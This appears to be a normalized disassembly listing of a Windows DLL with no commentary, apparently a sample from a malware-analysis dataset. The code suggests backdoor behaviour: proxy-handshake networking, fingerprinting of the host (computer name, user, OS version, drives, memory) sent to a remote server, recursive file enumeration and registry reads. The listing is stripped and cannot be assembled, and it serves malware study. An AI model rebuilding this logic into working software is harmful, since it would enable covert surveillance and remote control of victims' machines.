lea edi [ esp + 0x28 ]
[ edi ]
mov ecx [ esp + 0x1a0 ]
mov [ esp + 0x28 ] 0x4
push ecx
mov [ esp + 0x2d ] 0x1
call ebp
mov edx [ esp + 0x19c ]
mov [ esp + 0x2a ] ax
push edx
call ebx
mov [ esp + 0x2c ] eax
push 0x0
lea eax [ esp + 0x2c ]
push 0x9
push eax
push esi
call [ send@IAT ]
test eax eax
jle r-xdata
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x8c ]
push ecx
push 0x0
push 0x0
push edx
push 0x0
mov [ esp + 0x34 ] 0x14
mov [ esp + 0x38 ] 0x0
mov [ esp + 0xa4 ] esi
mov [ esp + 0xa0 ] 0x1
call [ select@IAT ]
test eax eax
jle r-xdata
mov ecx 0x19
xor eax eax
lea edi [ esp + 0x28 ]
push eax
[ edi ]
lea eax [ esp + 0x2c ]
push 0x64
push eax
push esi
call [ recv@IAT ]
test eax eax
jle r-xdata
mov al [ esp + 0x28 ]
test al al
jne r-xdata
cmp [ esp + 0x29 ] 0x5a
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x180
retn
sub_10004850
sub esp 0x374
push esi
push edi
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov ecx [ esp + 0x384 ]
mov esi eax
xor eax eax
push ecx
mov [ esp + 0xc ] eax
mov [ esp + 0xc ] 0x2
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
call [ htons@IAT ]
mov edx [ esp + 0x380 ]
mov [ esp + 0xa ] ax
push edx
call [ inet_addr@IAT ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0x8 ]
push 0x10
push eax
push esi
call [ connect@IAT ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x38c ]
mov edx [ esp + 0x388 ]
and ecx 0xffff
lea eax [ esp + 0x124 ]
push ecx
push edx
push rw-data
push eax
call [ sprintf@IAT ]
lea edi [ esp + 0x134 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
push 0x0
push ecx
lea ecx [ esp + 0x12c ]
push ecx
push esi
call [ send@IAT ]
test eax eax
jg r-xdata
push esi
call [ closesocket@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x374
retn
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x20 ]
push edx
push 0x0
push 0x0
push eax
push 0x0
mov [ esp + 0x2c ] 0x14
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x38 ] esi
mov [ esp + 0x34 ] 0x1
call [ select@IAT ]
test eax eax
jg r-xdata
push esi
call [ closesocket@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x374
retn
mov ecx 0x96
xor eax eax
lea edi [ esp + 0x124 ]
push eax
[ edi ]
lea ecx [ esp + 0x128 ]
push 0x258
push ecx
push esi
call [ recv@IAT ]
test eax eax
jg r-xdata
push esi
call [ closesocket@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x374
retn
lea edx [ esp + 0x124 ]
push rw-data
push edx
call [ strstr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
push esi
call [ closesocket@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x374
retn
mov eax esi
pop edi
pop esi
add esp 0x374
retn
push esi
call [ closesocket@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x374
retn
sub_100049f0
sub esp 0x26c
push esi
push edi
mov esi 0x80000001
call sub_100041e0
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x0
push eax
push rw-data
push esi
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
mov [ esp + 0x14 ] 0x40
call [ GetUserNameA@IAT ]
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x14 ]
lea edx [ esp + 0x34 ]
[ edi ]
mov [ esp + 0x14 ] 0x20
mov [ esp + 0x1c ] edx
mov [ esp + 0x18 ] 0x1
call [ RevertToSelf@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x26c
retn
mov ecx 0x7f
lea edi [ esp + 0x75 ]
mov [ esp + 0x74 ] al
push ebp
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x78 ]
stosb [ edi ]
push ecx
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
push edx
push eax
push 0x0
push rw-data
push ecx
mov [ esp + 0x28 ] 0x200
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push rw-data
push rw-data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
pop ebp
push ebx
mov ebx [ strstr@IAT ]
lea edx [ esp + 0x7c ]
push rw-data
push edx
call ebx
mov ebp [ esp + 0x288 ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov esi [ esp + 0x30 ]
lea edx [ esp + 0x7c ]
push rw-data
push edx
call ebx
add esp 0x8
mov edi eax
test edi edi
pop ebx
je r-xdata
add esi 0x5
push 0x3a
push esi
call [ strchr@IAT ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
add edi 0x6
push 0x3a
push edi
call [ strchr@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
cmp edi esi
je r-xdata
cmp esi edi
je r-xdata
lea eax [ edi + 0x1 ]
push eax
call [ atoi@IAT ]
add esp 0x4
mov [ ebp + 0x44 ] eax
test eax eax
jl r-xdata
lea eax [ esi + 0x1 ]
push eax
call [ atoi@IAT ]
add esp 0x4
mov [ ebp + 0x20 ] eax
test eax eax
jl r-xdata
mov [ ebp + 0x44 ] 0x0
sub edi esi
lea ecx [ ebp + 0x24 ]
push edi
push esi
push ecx
call [ strncpy@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp + 0x20 ] 0x0
sub esi edi
push esi
push edi
push ebp
call [ strncpy@IAT ]
add esp 0xc
jmp r-xdata
sub_10004bd0
mov eax [ rw-data ]
sub esp 0x104
push ebx
xor ebx ebx
test eax eax
jne r-xdata
call eax
pop ebx
add esp 0x104
retn
push ebp
push esi
push edi
lea eax [ esp + 0x10 ]
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebp
je r-xdata
mov eax ebx
pop ebx
add esp 0x104
retn
sub_10004c60
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_1000da4e
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x28c
push ebx
push ebp
xor ebp ebp
push esi
cmp eax ebp
push edi
jne r-xdata
mov ecx [ esp + 0x29c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x298
retn
mov eax [ esp + 0x2ac ]
mov [ rw-data ] 0x1
cmp eax 0x64
mov [ esp + 0x28 ] ebp
je r-xdata
cmp [ rw-data ] ebp
jne r-xdata
call sub_10004580
mov [ esp + 0x28 ] eax
lea eax [ esp + 0xcc ]
push eax
call sub_100042d0
add esp 0x4
lea ecx [ esp + 0x10c ]
push ecx
push 0x202
call [ WSAStartup@IAT ]
jmp r-xdata
push ebp
push ebp
push sub_10002590
call [ _beginthread@IAT ]
add esp 0xc
mov esi [ Sleep@IAT ]
push 0x1388
mov [ rw-data ] bp
call esi
lea edx [ esp + 0xcc ]
lea eax [ esp + 0xac ]
push edx
lea ecx [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0x20 ] ebp
call sub_100043b0
mov ebx eax
mov eax [ esp + 0x20 ]
add esp 0xc
cmp eax ebp
mov [ esp + 0x2c ] ebx
jne r-xdata
mov ecx 0x12
xor eax eax
lea edi [ esp + 0x64 ]
lea edx [ esp + 0x64 ]
[ edi ]
push edx
xor esi esi
mov [ esp + 0x17 ] 0x0
call sub_100049f0
mov eax [ esp + 0x18 ]
add esp 0x4
cmp eax ebp
mov [ esp + 0x24 ] ebp
mov [ esp + 0x20 ] ebp
jle r-xdata
push 0x2710
call esi
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] 0xffffffff
test eax eax
mov [ esp + 0x20 ] 0x0
jle r-xdata
lea eax [ esp + 0xac ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x2c ]
push eax
call ??3@YAXPAX@Z
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x18 ]
add esp 0x4
cmp ecx eax
jge r-xdata
lea eax [ esp + 0xac ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov al [ esp + 0x88 ]
test al al
je r-xdata
mov eax [ esp + 0x84 ]
mov edi ebp
and edi 0xffff
mov [ rw-data ] ax
push edi
push ebx
push eax
lea eax [ esp + 0x70 ]
push eax
call sub_10004700
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor ebp ebp
test esi esi
je r-xdata
mov bp [ eax ]
mov eax [ eax ]
push 0x0
push 0x1
shr eax 0x10
push 0x2
mov [ rw-data ] bp
mov [ esp + 0x24 ] eax
call [ socket@IAT ]
mov esi eax
xor eax eax
mov [ esp + 0x34 ] eax
push ebp
mov [ esp + 0x3c ] eax
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
call [ htons@IAT ]
push ebx
mov [ esp + 0x3a ] ax
call [ inet_addr@IAT ]
mov [ esp + 0x38 ] eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x10
lea ebx [ ebx + ecx + 0x1 ]
lea ecx [ esp + 0x38 ]
push ecx
push esi
call [ connect@IAT ]
test eax eax
je r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x14 ]
[ edi ]
mov eax [ esp + 0x1c ]
not ecx
dec ecx
add eax 0x4
mov [ esp + 0x1c ] eax
lea ebx [ ebx + ecx + 0x1 ]
mov ecx [ esp + 0x20 ]
inc ecx
cmp ecx edx
mov [ esp + 0x20 ] ecx
jl r-xdata
mov eax [ esp + 0xa8 ]
mov edi ebp
and edi 0xffff
mov [ rw-data ] ax
push edi
push ebx
push eax
lea eax [ esp + 0x94 ]
push eax
call sub_10004850
mov esi eax
add esp 0x10
test esi esi
je r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x13 ]
shl edx 0x6
push ecx
push 0x1
add edx rw-data
push edi
push edx
push esi
mov [ esp + 0x38 ] 0x1
call sub_10005420
add esp 0x14
test eax eax
jg r-xdata
mov edi [ setsockopt@IAT ]
lea edx [ esp + 0x44 ]
push 0x4
push edx
push 0x8
mov ebx 0x1
push 0xffff
push esi
mov [ esp + 0x58 ] ebx
call edi
xor eax eax
xor ecx ecx
mov [ esp + 0x4c ] eax
lea edx [ esp + 0x54 ]
push eax
mov [ esp + 0x54 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] ecx
mov [ esp + 0x58 ] eax
push eax
push edx
lea eax [ esp + 0x64 ]
mov [ esp + 0x6c ] ecx
push 0xc
push eax
lea ecx [ esp + 0x5c ]
push 0xc
push ecx
push 0x98000004
push esi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x74 ] 0x2710
mov [ esp + 0x70 ] 0x7530
call [ WSAIoctl@IAT ]
lea edx [ esp + 0x30 ]
push 0x4
push edx
push 0x1005
push 0xffff
push esi
mov [ esp + 0x44 ] 0xea60
call edi
lea eax [ esp + 0x30 ]
push 0x4
push eax
push 0x1006
push 0xffff
push esi
call edi
call sub_10004bd0
push 0x88
mov ebx eax
mov [ rw-data ] bp
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x2c ] eax
test eax eax
mov [ esp + 0x2a4 ] 0x0
je r-xdata
mov eax [ esp + 0x24 ]
lea edx [ esp + 0x13 ]
push edx
mov edx [ esp + 0x1c ]
mov ecx ebp
push eax
shl edx 0x6
and ecx 0xffff
add edx rw-data
push ecx
push edx
push esi
call sub_10005420
add esp 0x14
test eax eax
jg r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x271d
jne r-xdata
mov bp [ eax ]
mov eax [ eax ]
shr eax 0x10
mov [ esp + 0x18 ] eax
mov al [ esp + 0x64 ]
test al al
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x13 ]
shl edx 0x6
push ecx
push 0x2
add edx rw-data
push edi
push edx
push esi
mov [ esp + 0x38 ] 0x2
call sub_10005420
add esp 0x14
test eax eax
jg r-xdata
push esi
call [ closesocket@IAT ]
push 0x3e8
xor esi esi
call [ Sleep@IAT ]
xor edi edi
push esi
mov ecx eax
call sub_100013c0
mov edi eax
jmp r-xdata
push esi
call [ closesocket@IAT ]
push 0x3e8
xor esi esi
call [ Sleep@IAT ]
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
inc eax
add edx 0x4
cmp eax ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] edx
jl r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ebx [ esp + 0x2c ]
xor ebp ebp
push esi
call [ closesocket@IAT ]
push 0x3e8
xor esi esi
call [ Sleep@IAT ]
test edi edi
je r-xdata
test eax eax
je r-xdata
mov cl [ esp + 0x13 ]
mov [ esp + 0x2a4 ] 0xffffffff
mov [ edi + 0x10 ] cl
mov ecx edi
call sub_10001540
mov ecx edi
call sub_100019c0
call sub_10004bd0
mov ecx [ edi + 0x14 ]
sub eax ebx
test ecx ecx
jne r-xdata
mov eax [ esp + 0x1c ]
push eax
call [ CloseHandle@IAT ]
mov [ esp + 0x28 ] 0x0
jmp r-xdata
push esi
call [ closesocket@IAT ]
jmp r-xdata
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx ]
mov edx [ esp + 0x18 ]
push eax
lea eax [ esp + 0xd0 ]
push edx
push eax
call sub_100042f0
lea ecx [ esp + 0xd8 ]
push ecx
call sub_10004360
add esp 0x10
sub_10005170
push ecx
lea eax [ esp ]
mov [ esp ] 0x0
push eax
push rw-data
push 0x80000002
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop ecx
retn
mov edx [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push ecx
mov ecx [ esp + 0x4 ]
lea eax [ esp + 0xc ]
push edx
push eax
push 0x0
push rw-data
push ecx
call [ RegQueryValueExA@IAT ]
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
sub_100051c0
sub esp 0x10
lea eax [ esp ]
mov [ esp + 0x4 ] 0x0
push eax
push rw-data
push 0x80000002
mov [ esp + 0x14 ] 0x4
mov [ esp + 0xc ] 0x0
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov ax [ esp + 0x4 ]
add esp 0x10
retn
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push ecx
mov ecx [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push edx
push eax
push 0x0
push rw-data
push ecx
call [ RegQueryValueExA@IAT ]
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
sub_10005230
sub esp 0x24
push esi
push edi
call [ GetCurrentProcessId@IAT ]
mov esi [ esp + 0x30 ]
mov edi [ GetModuleFileNameA@IAT ]
push 0x80
mov [ esi + 0x368 ] eax
lea eax [ esi + 0x36c ]
push eax
push 0x0
call edi
mov ecx 0x7f
sub ecx eax
test ecx ecx
jle r-xdata
lea edx [ esp + 0x8 ]
lea eax [ esi + 0x3ec ]
push edx
push eax
mov [ esp + 0x10 ] 0x20
call [ GetUserNameA@IAT ]
lea ecx [ esi + 0x40c ]
push 0x80
push ecx
call [ GetWindowsDirectoryA@IAT ]
mov ecx 0x7f
sub ecx eax
test ecx ecx
jle r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
lea eax [ esp + 0xc ]
push eax
call [ GlobalMemoryStatus@IAT ]
mov ecx [ esp + 0x14 ]
lea edx [ esi + 0x494 ]
push 0x78
mov [ esi + 0x48c ] ecx
push edx
mov [ esi + 0x490 ] 0x0
call sub_10005170
add esp 0x8
call sub_100051c0
mov [ esi + 0x50c ] ax
pop edi
pop esi
add esp 0x24
retn
lea edx [ eax + esi + 0x40d ]
push ecx
push edx
call [ GetSystemDirectoryA@IAT ]
push ecx
lea ecx [ eax + esi + 0x36d ]
push ecx
push edx
call edi
sub_10005310
push ebx
push esi
mov esi [ GetTickCount@IAT ]
push edi
mov edi [ GetCurrentProcessId@IAT ]
xor bl bl
call edi
mov ebx eax
call esi
add bl al
jmp r-xdata
cmp bl 0xff
jne r-xdata
test bl bl
je r-xdata
pop edi
mov al bl
pop esi
pop ebx
retn
sub_10005340
push esi
push edi
mov edi [ esp + 0x10 ]
xor esi esi
xor ecx ecx
mov edx 0x7ab7
test edi edi
jle r-xdata
mov eax esi
pop edi
pop esi
retn
push ebx
push ebp
mov ebp [ esp + 0x14 ]
mov ebx edx
xor eax eax
imul ebx esi
imul edx edx 0x6a2f
mov al [ ecx + ebp ]
add eax ebx
inc ecx
cmp ecx edi
mov esi eax
jl r-xdata
pop ebp
pop ebx
pop edi
pop esi
retn
sub_10005380
push ecx
push esi
mov esi [ esp + 0xc ]
push esi
mov [ esp + 0x8 ] 0x0
call sub_10004280
add esp 0x4
test eax eax
jg r-xdata
push 0x0
lea eax [ esp + 0x8 ]
push 0x4
push eax
push esi
call [ recv@IAT ]
cmp eax 0x4
je r-xdata
xor eax eax
pop esi
pop ecx
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x4 ]
mov eax 0x1
pop esi
mov [ ecx ] edx
pop ecx
retn
xor eax eax
pop esi
pop ecx
retn
sub_100053d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
xor esi esi
test edi edi
jle r-xdata
xor eax eax
cmp esi edi
pop edi
pop esi
pop ebp
pop ebx
sete al
retn
mov ebp [ esp + 0x18 ]
mov ebx [ esp + 0x14 ]
mov eax edi
push 0x0
sub eax esi
lea ecx [ esi + ebp ]
push eax
push ecx
push ebx
call [ send@IAT ]
test eax eax
jle r-xdata
add esi eax
cmp esi edi
jl r-xdata
push ebx
call sub_10004230
add esp 0x4
test eax eax
jle r-xdata
sub_10005420
sub esp 0xb54
push ebx
push ebp
push esi
push edi
mov ecx 0x154
xor eax eax
lea edi [ esp + 0xc4 ]
lea edx [ esp + 0x110 ]
[ edi ]
mov ax [ esp + 0xb74 ]
mov edi rw-data
mov [ esp + 0x5d2 ] ax
or ecx 0xffffffff
xor eax eax
mov [ esp + 0xcc ] 0x2
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0xc4 ] 0xdf1f1ed3
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0xb6c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x5d4 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0xb70 ]
push ecx
push edx
push rw-data
push 0x40
push eax
call [ _snprintf@IAT ]
add esp 0x14
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0xd0 ]
mov [ esp + 0x24 ] 0x40
push ecx
push edx
call [ GetComputerNameA@IAT ]
call [ GetSystemDefaultLangID@IAT ]
mov si ax
and esi 0xffff
call [ GetACP@IAT ]
shl eax 0x10
or esi eax
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0xcc ] esi
mov [ esp + 0x2c ] 0x9c
call [ GetVersionExA@IAT ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x2c ]
mov ebx [ esp + 0x30 ]
mov [ esp + 0x138 ] ecx
mov eax edx
mov ecx ebx
and eax 0xff
and ecx 0xff
mov [ esp + 0x130 ] eax
mov [ esp + 0x134 ] ecx
lea edi [ esp + 0x3c ]
or ecx 0xffffffff
xor eax eax
lea ebp [ esp + 0x13c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp edx 0x6
[ edi ] [ esi ]
jne r-xdata
cmp edx 0x5
jne r-xdata
cmp [ esp + 0xc2 ] 0x1
je r-xdata
mov ebp [ GetDriveTypeA@IAT ]
mov [ esp + 0x11 ] 0x3a
mov [ esp + 0x12 ] 0x0
mov bl 0x41
mov edi 0x41
lea esi [ esp + 0x1c0 ]
cmp ebx 0x2
jne r-xdata
jmp r-xdata
mov [ esi - 0x4 ] eax
cmp eax 0x5
mov [ esi ] edi
je r-xdata
cmp eax 0x5
je r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
or [ esp + 0x130 ] 0x80000000
add esi 0x18
lea edx [ esi + 0xc ]
lea eax [ esi + 0x4 ]
push edx
push eax
lea ecx [ esp + 0x18 ]
push 0x0
push ecx
call [ GetDiskFreeSpaceExA@IAT ]
cmp eax 0x6
jne r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] bl
push ecx
call ebp
cmp eax 0x3
je r-xdata
lea edx [ esp + 0xc4 ]
push edx
call sub_10005230
mov ecx 0x154
xor eax eax
lea edi [ esp + 0x618 ]
push 0x8
[ edi ]
lea eax [ esp + 0xcc ]
push 0x550
lea ecx [ esp + 0x20 ]
push eax
lea edx [ esp + 0x624 ]
push ecx
push edx
mov [ esp + 0x2c ] 0x550
call sub_10009d40
call sub_10005310
mov bl al
mov eax [ esp + 0x2c ]
mov [ esp + 0x30 ] bl
mov ecx [ esp + 0x30 ]
and ecx 0xff
lea edx [ esp + 0x62c ]
shl ecx 0x18
add ecx eax
push eax
push edx
mov [ esp + 0x38 ] ecx
call sub_10005340
mov esi [ esp + 0xb88 ]
mov edi eax
lea eax [ esp + 0x38 ]
push 0x4
push eax
push esi
mov [ esp + 0x48 ] 0x0
call sub_100053d0
add esp 0x2c
test eax eax
jne r-xdata
inc bl
inc edi
cmp bl 0x5a
jle r-xdata
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x614 ]
push ecx
push edx
push esi
call sub_100053d0
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xb54
retn
lea eax [ esp + 0x1c ]
push eax
push esi
call sub_10005380
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xb54
retn
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x20 ]
cmp edi ecx
push 0x1
sete cl
push edx
push esi
mov [ esp + 0x2c ] cl
call sub_100053d0
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xb54
retn
mov eax [ esp + 0xb78 ]
pop edi
pop esi
pop ebp
mov [ eax ] bl
mov eax [ esp + 0x14 ]
and eax 0xff
pop ebx
add esp 0xb54
retn
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xb54
retn
sub_10005730
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x2e
jne r-xdata
xor eax eax
retn
mov al [ ecx + 0x1 ]
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
mov eax 0x1
retn
mov al [ ecx + 0x2 ]
test al al
jne r-xdata
mov eax 0x1
retn
sub_10005760
sub esp 0x140
push esi
push edi
xor edi edi
push edi
call [ SetLastError@IAT ]
mov ecx [ esp + 0x14c ]
lea eax [ esp + 0x8 ]
push eax
push ecx
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
pop edi
pop esi
add esp 0x140
retn
push ebp
mov ebp [ FindNextFileA@IAT ]
inc edi
lea edx [ esp + 0x38 ]
push edx
call sub_10005730
add esp 0x4
test eax eax
jne r-xdata
test [ esp + 0xc ] 0x10
je r-xdata
push esi
call [ FindClose@IAT ]
mov eax edi
pop ebp
pop edi
pop esi
add esp 0x140
retn
lea eax [ esp + 0xc ]
push eax
push esi
call ebp
test eax eax
jne r-xdata
sub_100057e0
mov edx [ esp + 0x8 ]
sub esp 0x14c
mov al [ edx ]
push ebx
push esi
push edi
test al al
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x14c
retn
mov esi [ esp + 0x164 ]
cmp [ esi ] 0x0
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0x104
mov [ esp + 0x10 ] ebx
jge r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0x104
jae r-xdata
push ebp
push 0x400
call ??2@YAPAXI@Z
mov ebp eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esp + 0x10 ] ebp
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebx + ebp - 0x1 ] 0x5c
je r-xdata
mov edi [ esp + 0x164 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x1c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebp
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
mov [ esp + 0x18 ] esi
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
push ebp
call ??3@YAXPAX@Z
add esp 0x4
pop ebp
mov ebx [ esp + 0x160 ]
push esi
call [ FindClose@IAT ]
mov ecx ebx
call sub_10001990
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x48 ]
push ecx
call sub_10005730
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x18 ]
lea eax [ esp + 0x1c ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov al [ esp + 0x1c ]
push 0x400
test al 0x10
je r-xdata
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
call ??2@YAPAXI@Z
mov ebp eax
mov ecx 0x100
xor eax eax
mov edi ebp
[ edi ]
mov ecx [ esp + 0x20 ]
lea edx [ ebp + 0x4 ]
mov [ ebp ] ecx
mov eax [ esp + 0x3c ]
mov edi [ esp + 0x16c ]
mov [ edx ] eax
mov ecx [ esp + 0x40 ]
add edx 0x4
xor eax eax
add esp 0x4
mov [ edx ] ecx
or ecx 0xffffffff
add edx 0x4
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
cmp [ edx + ecx - 0x1 ] 0x5c
je r-xdata
call ??2@YAPAXI@Z
mov edi [ esp + 0x16c ]
mov ebp eax
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
sub edi ecx
mov eax [ esp + 0x14 ]
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ eax + ebp - 0x1 ] 0x5c
je r-xdata
lea edi [ esp + 0x48 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ esp + 0x164 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
sub edx ebp
lea edx [ ecx + edx + 0x1 ]
mov ecx ebx
push edx
push ebp
push 0x400
push 0xa021
call sub_10001f60
push ebp
call ??3@YAXPAX@Z
add esp 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x48 ]
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x168 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call sub_100057e0
push ebp
call ??3@YAXPAX@Z
add esp 0x10
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
